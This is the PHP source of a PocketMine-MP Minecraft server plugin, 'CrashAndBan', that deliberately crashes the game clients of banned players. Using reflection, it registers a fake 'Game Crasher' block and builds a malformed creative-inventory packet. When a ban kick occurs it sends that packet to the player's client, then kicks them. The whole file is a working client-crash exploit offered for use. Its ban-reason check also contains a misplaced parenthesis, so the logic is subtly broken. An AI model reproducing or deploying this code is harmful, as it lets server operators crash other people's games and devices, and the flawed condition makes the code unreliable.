<?php
declare(strict_types=1);
namespace jasonwynn10\CrashAndBan;

use pocketmine\block\Block;
use pocketmine\block\BlockFactory;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerKickEvent;
use pocketmine\item\ItemBlock;
use pocketmine\network\mcpe\protocol\InventoryContentPacket;
use pocketmine\network\mcpe\protocol\types\ContainerIds;
use pocketmine\Player;
use pocketmine\plugin\PluginBase;
use pocketmine\scheduler\Task;
use pocketmine\Server;

class Main extends PluginBase implements Listener {
	/** @var InventoryContentPacket $pk */
	protected static $pk;

	/**
	 * @return InventoryContentPacket
	 */
	public static function getCrashPacket() : InventoryContentPacket {
		return clone self::$pk;
	}

	public function onEnable() {
		$this->getServer()->getPluginManager()->registerEvents($this, $this);

		$ref = new \ReflectionClass(BlockFactory::class);
		$prop = $ref->getProperty("fullList");
		$prop->setAccessible(true);
		$array = $prop->getValue();
		$array->setSize(8192);
		$prop->setValue($array);

		BlockFactory::$solid->setSize(512);
		BlockFactory::$transparent->setSize(512);
		BlockFactory::$hardness->setSize(512);
		BlockFactory::$light->setSize(512);
		BlockFactory::$lightFilter->setSize(512);
		BlockFactory::$diffusesSkyLight->setSize(512);
		BlockFactory::$blastResistance->setSize(512);

		$newBlock = new class(511) extends Block {
			public function getName() : string {
				return "Game Crasher";
			}
		};
		BlockFactory::registerBlock($newBlock, true);

		self::$pk = $pk = new class() extends InventoryContentPacket{
			public function canBeSentBeforeLogin() : bool {
				return true;
			}
		};
		$pk->items = [];
		$pk->items[] = new ItemBlock(511, 0, 255-511);
		$pk->windowId = ContainerIds::CREATIVE;
	}

	public function onKick(PlayerKickEvent $event) {
		if($event->getReason() === "You are banned" or strpos($event->getReason(), "Banned by admin" or strpos($event->getReason(), "IP banned.")) !== false) {
			$this->getScheduler()->scheduleDelayedTask(new class($event->getPlayer()) extends Task {
				/** @var Player $player */
				protected $player;

				public function __construct(Player $player) {
					$this->player = $player;
				}

				/**
				 * @inheritDoc
				 */
				public function onRun(int $currentTick) {
					$pk = Main::getCrashPacket();
					$this->player->sendDataPacket($pk);
					$plugin = Server::getInstance()->getPluginManager()->getPlugin("CrashAndBan");
					$plugin->getLogger()->debug("Crashed client of ".$this->player->getName());
					$plugin->getScheduler()->scheduleDelayedTask(new class($this->player) extends Task {
						/** @var Player $player */
						protected $player;

						public function __construct(Player $player) {
							$this->player = $player;
						}
						/**
						 * @inheritDoc
						 */
						public function onRun(int $currentTick) {
							$this->player->kick("Banned for ", false);
							$plugin = Server::getInstance()->getPluginManager()->getPlugin("CrashAndBan");
							$plugin->getLogger()->debug("Client of ".$this->player->getName()."Has too high ping to crash. (Ping of ".$this->player->getPing().")");
						}
					}, 10);
				}
			}, 15);
			$event->setCancelled();
		}
	}
}